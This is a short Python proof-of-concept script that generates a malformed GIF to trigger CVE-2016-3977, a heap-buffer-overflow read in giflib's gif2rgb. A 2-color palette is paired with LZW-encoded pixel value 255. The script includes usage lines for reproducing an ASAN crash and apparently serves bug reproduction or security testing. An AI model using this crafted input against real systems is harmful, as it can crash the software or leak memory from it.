#!/usr/bin/env python3
"""Generate a crafted GIF that triggers CVE-2016-3977.

heap-buffer-overflow READ in DumpScreen2RGB (util/gif2rgb.c:293)

The GIF declares a 2-entry global colormap but LZW-encodes pixel value 255,
causing gif2rgb to read 765 bytes past the end of a 6-byte Colors allocation.

Usage:
    python3 gen_gif2rgb_oob_read.py > poc_gif2rgb.gif
    gif2rgb poc_gif2rgb.gif          # triggers ASAN crash
"""

import struct
import sys

header = b"GIF89a"

# Logical Screen Descriptor: 2x2, global CT with 2 colors
lsd = struct.pack("<HHBBb", 2, 2, 0x80, 0, 0)

# Global Color Table: 2 entries (6 bytes)
gct = bytes([255, 0, 0, 0, 255, 0])

# Image Descriptor: 2x2, no local CT
img_desc = b"," + struct.pack("<HHHHB", 0, 0, 2, 2, 0)

# LZW Image Data: min code size 8 so pixel values can reach 255
# Encode: clear(256), 255, 255, 255, 255, EOF(257) at 9 bits each
bits: list[int] = []


def add_code(code: int, size: int) -> None:
    for i in range(size):
        bits.append((code >> i) & 1)


add_code(256, 9)  # clear
add_code(255, 9)  # pixel 255 — OOB for 2-color map
add_code(255, 9)
add_code(255, 9)
add_code(255, 9)
add_code(257, 9)  # EOF

img_bytes: list[int] = []
for i in range(0, len(bits), 8):
    byte = 0
    for j in range(8):
        if i + j < len(bits):
            byte |= bits[i + j] << j
    img_bytes.append(byte)

img_data = bytes([8]) + bytes([len(bytes(img_bytes))]) + bytes(img_bytes) + bytes([0])

gif = header + lsd + gct + img_desc + img_data + b";"

sys.stdout.buffer.write(gif)
